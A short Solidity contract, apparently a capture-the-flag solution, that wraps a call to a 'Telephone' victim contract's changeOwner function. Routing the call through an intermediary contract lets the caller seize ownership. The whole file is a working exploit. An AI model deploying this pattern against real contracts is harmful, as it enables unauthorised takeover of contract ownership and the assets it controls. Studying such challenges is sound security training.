// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './telephone.sol';

contract TelephoneAttack {

    Telephone public telephone;

    constructor(address _victimAddress) public {
        telephone = Telephone(_victimAddress);
    }

    function becomeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
